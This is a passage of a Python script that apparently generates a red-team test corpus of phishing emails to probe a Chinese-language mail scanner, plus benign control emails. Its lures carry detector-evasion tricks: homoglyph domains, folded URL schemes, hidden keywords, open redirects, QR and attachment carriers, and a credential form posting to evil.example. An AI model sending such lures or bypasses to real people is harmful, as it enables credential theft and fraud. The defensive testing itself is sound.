       "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
       "Message-ID: <ev38@partner.example>\r\n"
       "Subject: 在吗\r\n"
       "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n")
write("ev38_ceo_homoglyph_lure.eml",
      (h38 + "在吗？我这边需要你帮忙处理一笔加急事项，先回复确认你在工位，细节我打给你。\r\n").encode("utf-8"))

# ev39: contact lure where the WeChat handle lives inside a PNG image.
import os as _os
lure2_png = os.path.join(ASSETS, "lure.png")
ev39_png_b64 = b64m.b64encode(open(lure2_png, "rb").read()).decode() if _os.path.exists(lure2_png) else ""
if ev39_png_b64:
    write("ev39_image_contact_card.eml", attach_eml("ev39", "加急对接",
        "你好，加急事项需要对接，请查看附件图片内的联系方式添加沟通，电话勿扰。", "contact.png", "image/png", ev39_png_b64))

# ev40: lure nested two levels down inside alternative/mixed so the body
# selector and the alternative-mismatch detector may pick different parts.
inner = (
    "--B40b\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n您好，请查收。\r\n"
    "--B40b\r\nContent-Type: text/html; charset=utf-8\r\n\r\n"
    "<html><body><p>尊敬的用户：您的账户存在异常登录，请立即点击链接验证身份，"
    f"24小时内未验证将冻结账户。<a href='http://{IP}/verify/login'>立即验证</a></p></body></html>\r\n"
    "--B40b--\r\n"
)
write("ev40_nested_alternative.eml", eml("ev40", "邮箱安全验证提醒", (
    "MIME-Version: 1.0\r\n"
    'Content-Type: multipart/alternative; boundary="B40a"\r\n\r\n'
    "--B40a\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n您好，请查收通知。\r\n"
    "--B40a\r\nContent-Type: multipart/mixed; boundary=\"B40b\"\r\n\r\n" + inner +
    "--B40a--\r\n"), ""))

# ev41: subject-only lure — does a phishing subject with a clean body reach
# Medium on subject evidence alone?
write("ev41_subject_only_lure.eml", eml("ev41", "邮箱密码今日过期，请立即更新",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "您好，本期企业通讯已发布，内容包括园区活动安排与食堂菜单更新，祝工作顺利。\r\n"))

# ctrl07: calibration — same neutral body as ev22/23 with a literal IP href.
write("ctrl07_plain_ip_href.eml", html_eml("ctrl07", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    f"<p><a href='http://{IP}/verify/login'>查看详情</a></p></body></html>"))

print("round5 sweep written")

# ---------------- round 6: 20-vector sweep (identity/attachment/dialect/chain)
IP = "203.0.113.60"

# ev42: rare Traditional forms possibly outside the ~160-char fold map
# (帳戶 vs 账户, 綁定, 匯款, 嚴重, 緊急).
write("ev42_rare_traditional_fold.eml", eml("ev42", "系統通知",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "您的帳戶已被凍結，請立即綁定手機並驗證身份，\r\n"
    "否則匯款功能將嚴重受限，緊急處理可聯繫客服。\r\n"))

# ev43: Cantonese/HK phrasing outside the zh-CN keyword corpus.
write("ev43_cantonese_lure.eml", eml("ev43", "帳戶通知",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "你嘅帳戶已被凍結，請立即登入驗證，\r\n"
    "唔係24小時內會被停用，快啲處理。\r\n"))

# ev44: literal CRLF+tab folded inside the href scheme (header-style folding
# inside an attribute); browsers strip C0/tab before URL parsing.
folded_href = "ht\r\ntps://" + IP + "/verify/login"
write("ev44_crlf_folded_scheme.eml", html_eml("ev44", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    "<p><a href='" + folded_href + "'>查看详情</a></p></body></html>"))

# ev45: macro document attachment, neutral body.
docm = b"PK\x03\x04" + b"\x90" * 512
write("ev45_docm_attachment.eml", attach_eml("ev45", "月度报告",
    "您好，附件为月度报告，请查收。", "report.docm", "application/vnd.ms-word.document.macroEnabled.12",
    b64m.b64encode(docm).decode()))

# ev46: ISO disk-image attachment (container-bypass malware carrier).
write("ev46_iso_attachment.eml", attach_eml("ev46", "资料光盘",
    "您好，附件为资料镜像，请挂载查看。", "data.iso", "application/x-iso9660-image",
    b64m.b64encode(b"\x90" * 512).decode()))

# ev47: LNK shortcut attachment with an embedded URL.
lnk = b"\x4c\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 40 + \
      ("http://" + IP + "/verify/login").encode() + b"\x00"
write("ev47_lnk_attachment.eml", attach_eml("ev47", "系统通知",
    "您好，请打开附件访问详情。", "details.lnk", "application/x-ms-shortcut",
    b64m.b64encode(lnk).decode()))

# ev48: Latin chunk-splitting — "ver ify you r ac count" defeats the strict
# letter-spaced compaction gate (single-letter ratio/run too low).
write("ev48_latin_chunk_split.eml", html_eml("ev48", "Mailbox notice",
    "<html><body><p>Dear user, ver ify you r ac count now to keep access."
    "Your mai lbox will be disabl ed in 24 hours.</p>"
    f"<p><a href='http://{IP}/verify'>http://{IP}/verify</a></p></body></html>"))

# ev49: vCard contact card whose URL field is the phishing destination.
vcf = ("BEGIN:VCARD\r\nVERSION:3.0\r\nFN:IT安全中心\r\nORG:信息技术部\r\n"
       "URL:http://" + IP + "/verify\r\nTEL;TYPE=WORK:400-123-4567\r\nEND:VCARD\r\n")
write("ev49_vcard_url_lure.eml", attach_eml("ev49", "联系人卡片",
    "您好，请打开附件保存部门联系人卡片。", "IT安全中心.vcf", "text/vcard",
    b64m.b64encode(vcf.encode()).decode()))

# ev50: calendar invite phishing (URL + lure inside the event).
ics = ("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\n"
       "SUMMARY:邮箱账户安全验证（24小时内）\r\n"
       "ORGANIZER:mailto:it-support@partner.example\r\n"
       "URL:http://" + IP + "/verify/login\r\n"
       "DESCRIPTION:您的账户存在异常登录，请点击链接完成验证\r\n"
       "END:VEVENT\r\nEND:VCALENDAR\r\n")
write("ev50_ics_invite_lure.eml", attach_eml("ev50", "会议邀请：安全验证",
    "您好，请接受会议邀请完成安全验证。", "verify.ics", "text/calendar",
    b64m.b64encode(ics.encode()).decode()))

# ev51: the lure exists ONLY in the attachment filename; the content is clean.
write("ev51_filename_lure.eml", attach_eml("ev51", "系统通知",
    "您好，详情见附件说明文件。", "您的账户存在异常登录请立即验证.txt", "text/plain",
    b64m.b64encode("本文件为系统自动生成，无其他内容。".encode()).decode()))

# ev52: keywords carried inside alt/title attributes — invisible to the text
# view (Gmail/Outlook show alt text when images are blocked).
write("ev52_alt_title_keywords.eml", html_eml("ev52", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    "<p><img src='https://cdn.example/logo.png' title='账户验证'"
    " alt='您的账户存在异常登录，请立即访问下方入口验证身份'></p>"
    f"<p><a href='http://{IP}/login'>入口</a></p></body></html>"))

# ev53: fake reply-thread context + bare domain (mail clients auto-linkify).
write("ev53_fake_reply_thread.eml", eml("ev53", "Re: 采购付款安排",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n"
    "In-Reply-To: <pur-2026@corp.internal>\r\n"
    "References: <pur-2026@corp.internal>\r\n\r\n",
    "按上次沟通的口径，请查收本期安排并确认：\r\n"
    "update-center.example.info\r\n").replace(
    'MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n'
    'In-Reply-To:', 'MIME-Version: 1.0\r\nIn-Reply-To:').replace(
    'charset=utf-8\r\n\r\n', 'charset=utf-8\r\n'
    ) if False else (
    "From: =?utf-8?B?" + b64m.b64encode("意向科技".encode()).decode() + "?= <it-support@partner.example>\r\n"
    "To: employee@corp.internal\r\n"
    "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
    "Message-ID: <ev53@partner.example>\r\n"
    "In-Reply-To: <pur-2026@corp.internal>\r\n"
    "References: <pur-2026@corp.internal>\r\n"
    "Subject: Re: 采购付款安排\r\n"
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "按上次沟通的口径，请查收本期安排并在线确认：\r\n"
    "update-center.example.info\r\n"
).encode("utf-8"))

# ev54: Greek-omicron TLD in a bare domain — ASCII-only bare extractor skips
# it while mail clients linkify and render .cοm.
write("ev54_greek_omicron_tld.eml", eml("ev54", "内部通告",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "详情见内部通告，确认入口：security-check.c\u03bfм\r\n".replace("м", "m")))

# ev55: credential form in the BODY using a mailto: action (no http link at
# all; the harvest arrives by reply mail).
write("ev55_mailto_cred_form.eml", html_eml("ev55", "身份确认",
    "<html><body><p>为完成身份确认，请在下方填写并提交：</p>"
    "<form action='mailto:conf1rm@evil.example?subject=verify' method='post'>"
    "账号 <input name='account'><br>"
    "密码 <input type='password' name='password'><br>"
    "<button>提交确认</button></form></body></html>"))

# ev56 KILL CHAIN 1: alt-carried keywords + vector SVG QR + neutral body.
qr_svg_inline2 = open(os.path.join(ASSETS, "qr.svg")).read().split("?>", 1)[-1].strip()
write("ev56_chain_alt_svgqr.eml", html_eml("ev56", "系统通知",
    "<html><body><p>请按提示完成系统通知确认。</p>"
    "<p><img src='https://cdn.example/banner.png' alt='您的账户存在异常登录，请扫码完成身份验证'></p>"
    + qr_svg_inline2 + "</body></html>"))

# ev57 KILL CHAIN 2: lure-only filename + attachment meta refresh to the IP.
att57 = ("<html><head><meta http-equiv='refresh' content='0;url=http://" + IP + "/verify/login'>"
         "</head><body>loading…</body></html>")
write("ev57_chain_filename_refresh.eml", attach_eml("ev57", "系统通知",
    "您好，请打开附件处理。", "账户异常验证入口.html", "text/html",
    b64m.b64encode(att57.encode()).decode()))

# ev58 KILL CHAIN 3: Cantonese body + Greek-omicron bare domain + form button.
write("ev58_chain_canto_greek_form.eml", html_eml("ev58", "帳戶通知",
    "<html><body><p>你嘅帳戶已被凍結，請立即確認，唔係會被停用。</p>"
    f"<form action='http://{IP}/verify'><button>立即確認</button></form>"
    "<p>或訪問 security-check.c\u03bfm 手動確認</p></body></html>"))

# ev59 KILL CHAIN 4: ics with CEO organizer spoof + lure summary + URL.
ics59 = ("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\n"
         "SUMMARY:加急：账户异常，需立即验证\r\n"
         "ORGANIZER;CN=张总-CEO办公室:mailto:ce0@partner.example\r\n"
         "URL:http://" + IP + "/verify/login\r\n"
         "DESCRIPTION:账户存在异常登录，24小时内未验证将冻结\r\n"
         "END:VEVENT\r\nEND:VCALENDAR\r\n")
write("ev59_chain_ics_ceo.eml", attach_eml("ev59", "加急：会议邀请",
    "张总发起的加急事项，请接受邀请处理。", "urgent.ics", "text/calendar",
    b64m.b64encode(ics59.encode()).decode()))

# ev60 KILL CHAIN 5: attachment HTML stacking class-hidden keyword breaks +
# a &Tab;-entity scheme link (both known attachment-layer gaps).
att60 = ("<html><head><style>.x{display:none}</style></head><body>"
         "<p>尊敬的用户：您的账<span class=x>kq</span>户存在异<span class=x>tb</span>常，"
         "请立即处理。</p>"
         "<p><a href='ht&Tab;tp://" + IP + "/verify/login'>处理入口</a></p></body></html>")
write("ev60_chain_attach_stack.eml", attach_eml("ev60", "邮箱安全验证提醒",
    "您好，请打开附件查看详情。", "notice.html", "text/html",
    b64m.b64encode(att60.encode()).decode()))

# ev61 KILL CHAIN 6: rare-traditional body + base-href relative credential
# path (folding gap + relative-link gap stacked).
write("ev61_chain_traditional_base.eml", html_eml("ev61", "系統通知",
    "<html><head><base href='http://" + IP + "/verify/'></head><body>"
    "<p>您的帳戶已被凍結，請立即綁定手機並驗證身份，否則匯款功能將嚴重受限。</p>"
    "<p><a href='login'>立即驗證</a></p></body></html>"))

print("round6 sweep written")

# ---------------- round 7: 20-vector sweep (sanitizer-inversion/i18n/TOAD/chains)
IP = "203.0.113.60"

# ev62: SANITIZER INVERSION — the whole body is ONE paragraph that begins with
# a gateway-banner pattern; strip_leading_notice_sections removes it and the
# empty remainder is classified as banner-only, so the keyword scan sees "".
write("ev62_banner_prefix_lure.eml", eml("ev62", "系统退回通知",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "【外部邮件】您的账户存在异常登录，为保障资金安全，请立即联系客服核验，"
    "24小时内未核验将冻结账户。\r\n"))

# ev63: same inversion via the auto-reply banner family.
write("ev63_autoreply_prefix_lure.eml", eml("ev63", "自动回复",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "自动回复：您的账户存在异常登录，请立即点击链接核验身份，"
    "24小时内未核验将停用账户。\r\n"))

# ev64/65/66: language-coverage absence — vi/th/id have no keyword lists.
write("ev64_vietnamese_lure.eml", html_eml("ev64", "Thong bao tai khoan",
    "<html><body><p>Tài khoản của bạn sẽ bị khóa trong vòng 24 giờ vì hoạt động "
    "đăng nhập bất thường. Vui lòng xác minh danh tính ngay:</p>"
    f"<p><a href='http://{IP}/verify'>http://{IP}/verify</a></p></body></html>"))

write("ev65_thai_lure.eml", html_eml("ev65", "แจ้งเตือนบัญชี",
    "<html><body><p>บัญชีของคุณจะถูกระงับภายใน 24 ชั่วโมงเนื่องจากกิจกรรมที่ผิดปกติ "
    "โปรดยืนยันตัวตนทันที:</p>"
    f"<p><a href='http://{IP}/verify'>http://{IP}/verify</a></p></body></html>"))

write("ev66_indonesian_lure.eml", html_eml("ev66", "Pemberitahuan akun",
    "<html><body><p>Akun Anda akan dinonaktifkan dalam 24 jam karena aktivitas "
    "login yang tidak biasa. Segera verifikasi identitas Anda:</p>"
    f"<p><a href='http://{IP}/verify'>http://{IP}/verify</a></p></body></html>"))

# ev67/68: TOAD phones using 幺 (phone reading of 1) and 两 (2) — absent from
# map_chinese_numerals.
write("ev67_yao_phone.eml", eml("ev67", "账户核验",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "您的账户存在异常，为避免冻结请立即致电客服核验：\r\n"
    "幺三八零零幺二三幺七八\r\n"))

write("ev68_liang_phone.eml", eml("ev68", "账户核验",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "您的账户存在异常，为避免冻结请立即致电客服核验：\r\n"
    "一三八两零零六幺二三四\r\n"))

# ev69: gift-card BEC paraphrase.
write("ev69_giftcard_bec.eml", eml("ev69", "在吗",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "在吗，帮我采购二十张一千面值的购物卡，下午开会要用，\r\n"
    "买好转我，卡的密码拍照回复这个邮箱即可。\r\n"))

# ev70: tax-subsidy rebate paraphrase.
write("ev70_tax_rebate_paraphrase.eml", eml("ev70", "温馨提示",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "2026年度个税专项扣除核对已开启，符合条件可核对退回金额，\r\n"
    "入口：tax-refund-check.example.info\r\n"))

# ev71: PII harvest by reply (onboarding).
write("ev71_pii_harvest_reply.eml", eml("ev71", "入职通知",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "恭喜通过终面，请回复本邮件附上身份证正反面照片与人脸视频，\r\n"
    "完成入职核验，24小时内有效。\r\n"))

# ev72: open-redirect parameter on a trusted host (in-body).
write("ev72_trusted_open_redirect.eml", html_eml("ev72", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    "<p><a href='https://docs.google.com/url?q=http://" + IP + "/login'>查看详情</a></p>"
    "</body></html>"))

# ev73: interlinear annotation anchors U+FFF9-FFFB inside keywords.
write("ev73_interlinear_break.eml", html_eml("ev73", "系统通知",
    "<html><body><p>您的账\ufff9户\ufffa存在\ufffb异常登录，请立即验证身份，"
    "24小时内未验证将冻结账户。</p></body></html>"))

# ev74: QR data-URI split across JS string chunks — the body data-URI regex
# never sees a contiguous base64 run; the browser reassembles and draws it.
qr_png_b64_r7 = b64m.b64encode(open(os.path.join(ASSETS, "qr.png"), "rb").read()).decode()
half = len(qr_png_b64_r7) // 2
qr_js = ("<html><body><p>请扫描下方二维码完成系统通知确认。</p>"
         "<canvas id='q' width='222' height='222'></canvas><script>"
         "var d='data:image/pn'+'g;base64," + qr_png_b64_r7[:half] + "'" +
         "+'" + qr_png_b64_r7[half:] + "';"
         "var i=new Image();i.onload=function(){document.getElementById('q').getContext('2d').drawImage(i,0,0)};"
         "i.src=d;</script></body></html>")
write("ev74_js_chunked_qr.eml", html_eml("ev74", "系统通知", qr_js))

# ev75: color-inverted QR PNG attachment (white modules on black).
qr_inv_b64 = b64m.b64encode(open(os.path.join(ASSETS, "qr_inv.png"), "rb").read()).decode()
write("ev75_inverted_qr_attach.eml", attach_eml("ev75", "系统通知",
    "您好，请扫描附件二维码完成确认。", "notice.png", "image/png", qr_inv_b64))

# ev76: paraphrase probe — threat wording without stock keywords.
write("ev76_paraphrase_no_keyword.eml", eml("ev76", "重要提醒",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "您的重要资料存在泄露风险，为避免影响使用，请尽快完成实名补录，\r\n"
    "逾期将限制相关功能。\r\n"))

# ev77: internal-domain string inside the display name.
disp77 = b64m.b64encode("corp.internal-IT支持中心".encode()).decode()
h77 = ("From: =?utf-8?B?" + disp77 + "?= <it@partner.example>\r\n"
       "To: employee@corp.internal\r\n"
       "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
       "Message-ID: <ev77@partner.example>\r\n"
       "Subject: 账户维护通知\r\n"
       "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n")
write("ev77_display_internal_domain.eml",
      (h77 + "请按通知完成账户维护，谢谢配合。\r\n").encode("utf-8"))

# ev78: lure hidden as the 98th part of a 100-part multipart.
parts78 = []
for i in range(98):
    parts78.append("--B78\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
                   f"归档段落 {i}：本段为历史归档内容，无其他信息。\r\n")
lure78 = ("--B78\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
          "尊敬的用户：您的账户存在异常登录，请立即点击链接验证身份，"
          f"24小时内未验证将冻结账户。 http://{IP}/verify/login\r\n")
tail78 = ("--B78\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
          "以上为全部归档内容。\r\n--B78--\r\n")
write("ev78_100part_lure_tail.eml", eml("ev78", "归档通知",
    "MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"B78\"\r\n\r\n"
    + "".join(parts78) + lure78 + tail78, ""))

# ev79: RTF attachment carrying an English lure (type-coverage probe).
rtf = ("{\\rtf1\\ansi English notice: verify your account immediately, "
       "your mailbox will be disabled in 24 hours. Click: http://" + IP + "/verify\\par}")
write("ev79_rtf_attach_lure.eml", attach_eml("ev79", "Notice",
    "Please open the attachment.", "notice.rtf", "application/rtf",
    b64m.b64encode(rtf.encode()).decode()))

# ev80 KILL CHAIN: banner-prefix inversion + 幺-phone (scanner sees nothing).
write("ev80_chain_banner_yao.eml", eml("ev80", "系统通知",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "【外部邮件】您的账户存在异常，请立即致电客服核验，"
    "24小时内未核验将冻结账户：幺三八零零幺二三幺七八\r\n"))

# ev81 KILL CHAIN: Vietnamese lure + trusted open-redirect + fake reply.
h81 = ("From: =?utf-8?B?" + b64m.b64encode("意向科技".encode()).decode() + "?= <it-support@partner.example>\r\n"
       "To: employee@corp.internal\r\n"
       "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
       "Message-ID: <ev81@partner.example>\r\n"
       "In-Reply-To: <vn-2026@corp.internal>\r\n"
       "References: <vn-2026@corp.internal>\r\n"
       "Subject: Re: Thong bao\r\n"
       "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n")
b81 = ("<html><body><p>Tài khoản của bạn sẽ bị khóa trong vòng 24 giờ. "
       "Vui lòng xác minh danh tính ngay:</p>"
       "<p><a href='https://docs.google.com/url?q=http://" + IP + "/login'>Xác minh</a>"
       "</p></body></html>")
write("ev81_chain_vi_redirect.eml", (h81 + b81).encode("utf-8"))

print("round7 sweep written")

# ---------------- ham corpus (benign hard negatives) ----------------
# Written into ham/ so the red-team harness (which only reads top-level
# *.eml) does not count them as bypasses. These are labelled benign in
# labels.json and exist to make the corpus trainable: same surface features
# as phish (banners, links, finance/maintenance/verification vocabulary,
# attachments) but genuinely harmless.
HAM = os.path.join(OUT, "ham")
os.makedirs(HAM, exist_ok=True)

def ham_write(name, data: bytes):
    with open(os.path.join(HAM, name), "wb") as f:
        f.write(data)
    print("wrote ham/" + name, len(data), "bytes")

def ham_eml(mid, subject, body_headers, body, sender="colleague@partner.example"):
    h = ("From: " + sender + "\r\n"
         "To: employee@corp.internal\r\n"
         "Date: Mon, 24 Aug 2026 09:30:00 +0800\r\n"
         f"Message-ID: <{mid}@partner.example>\r\n"
         f"Subject: {subject}\r\n{body_headers}\r\n")
    return (h + body).encode("utf-8")

PLAIN = "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n"

ham_write("ham01_meeting_notice.eml", ham_eml("ham01", "周三项目例会调整到 14:00", PLAIN,
    "各位：本周三的项目例会调整到 14:00，地点仍是 3F-301，\r\n"
    "议程不变：上周遗留问题、本周排期与风险同步。准时参加。\r\n"))

ham_write("ham02_weekly_report.eml", ham_eml("ham02", "第34周项目周报", PLAIN,
    "本周进展：网关联调完成 90%，压测数据已归档；\r\n"
    "风险：上游接口变更待确认；下周计划：灰度上线准备。\r\n"
    "详细版见共享盘目录 /projects/2026/week34。\r\n"))

ham_write("ham03_hr_policy.eml", ham_eml("ham03", "关于调整考勤填报入口的通知", PLAIN,
    "自 9 月 1 日起考勤填报入口迁移至内部门户首页，\r\n"
    "原入口保留一个月。操作指引见 https://portal.corp.internal/attend\r\n"
    "如有问题联系人资部王老师（分机 8021）。\r\n", sender="hr@corp.internal"))

ham_write("ham04_vendor_invoice_notice.eml", ham_eml("ham04", "8月服务费发票已开具", PLAIN,
    "您好：8月运维服务费发票已开具并寄出，抬头与税号按合同约定，\r\n"
    "预计 3 个工作日送达，请留意查收并对账。\r\n"
    "电子底联同步发送至贵司财务邮箱。\r\n", sender="billing@vendor.example"))

ham_write("ham05_it_maintenance.eml", ham_eml("ham05", "本周末核心交换机例行维护", PLAIN,
    "定于本周六 02:00-06:00 对核心交换机例行维护，期间内网出现分钟级闪断，\r\n"
    "生产业务不涉及。值班电话分机 6000。详情见 https://portal.corp.internal/notice/2026-35\r\n",
    sender="noc@corp.internal"))

ham_write("ham06_family_trip.eml", ham_eml("ham06", "十一回家行程", PLAIN,
    "妈：十一我 30 号晚上到，高铁 G1024，别来接站。\r\n"
    "想吃的：酸菜排骨、粘豆包。给我留点秋梨就行。\r\n"
    "票订好后把房间收拾出来，我带娃回去住几天。\r\n", sender="me@family.example"))

ham_write("ham07_conference_cfp.eml", ham_eml("ham07", "CFP reminder: APSEC 2026 due Sep 15", PLAIN,
    "Dear authors,\n\nThis is a friendly reminder that the APSEC 2026\n"
    "submission deadline is Sep 15 (AoE). Please upload your PDF via\n"
    "https://conf.apsec2026.example/submit before the deadline.\n\n"
    "Program committee, APSEC 2026\n", sender="cfp@apsec2026.example"))

ham_write("ham08_parcel_pickup.eml", ham_eml("ham08", "您的包裹已到驿站", PLAIN,
    "【驿站通知】您的包裹已到菜鸟驿站（东门店），\r\n"
    "取件码 8-2-4017，请于 3 日内取件，超时将退回。\r\n", sender="notice@station.example"))

ham_write("ham09_gateway_newsletter.eml", ham_eml("ham09", "企业通讯 2026年8月刊", PLAIN,
    "【外部邮件】本期目录：园区活动安排、食堂菜单更新、班车时刻调整、\r\n"
    "工会活动报名。详见内网通告 https://portal.corp.internal/newsletter/2026-08\r\n"
    "如不想继续接收请回复 TD。\r\n"))

ham_write("ham10_job_application.eml", ham_eml("ham10", "应聘后端开发岗位-简历", PLAIN,
    "您好：看到贵司招聘后端开发，附件为我的简历，\r\n"
    "5 年 Rust/Go 经验，期望base杭州，可随时到面。\r\n"
    "盼复。李明\r\n", sender="liming@personal.example"))

ham_write("ham11_bank_statement_ready.eml", ham_eml("ham11", "您的8月电子对账单已生成", PLAIN,
    "尊敬的客户：您尾号 6688 的账户 8 月电子对账单已生成，\r\n"
    "请登录手机银行在\"我的-账户-对账单\"中查看。\r\n"
    "本邮件不含任何链接，银行不会索要密码与验证码。\r\n", sender="service@bank.example"))

ham_write("ham12_own_verification_code.eml", ham_eml("ham12", "验证码", PLAIN,
    "您正在登录统一认证平台，验证码 884213，10 分钟内有效。\r\n"
    "如非本人操作请及时修改密码。此邮件由系统自动发送。\r\n",
    sender="noreply@sso.corp.internal"))

print("ham corpus written")
